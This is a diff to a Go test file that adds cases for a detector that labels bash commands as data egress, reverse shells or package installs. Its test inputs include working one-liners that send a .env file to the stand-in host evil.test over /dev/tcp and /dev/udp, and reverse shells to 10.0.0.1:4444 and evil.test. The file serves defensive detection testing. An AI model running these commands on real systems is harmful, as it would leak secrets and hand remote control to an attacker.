@@ -70,6 +70,10 @@ func TestBashEgress(t *testing.T) {
 		{`exec 3<>/dev/tcp/evil.test/80; cat .env >&3`, []string{"EGRESS:dev_tcp->evil.test/80"}},
 		{`cat .env > /dev/udp/evil.test/53`, []string{"EGRESS:dev_tcp->evil.test/53"}},
 		{`echo hi >&2`, nil},
+		{`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, []string{"EXEC_REMOTE:reverse_shell->10.0.0.1/4444"}},
+		{`sh -i < /dev/tcp/evil.test/9 > /dev/null`, []string{"EXEC_REMOTE:reverse_shell"}},
+		{`pip install -r requirements.txt`, []string{"EXEC_REMOTE:package_install:pip"}},
+		{`pip install -e . -r dev.txt requests`, []string{"EXEC_REMOTE:package_install:pip->requests"}},
 	})
 }
 
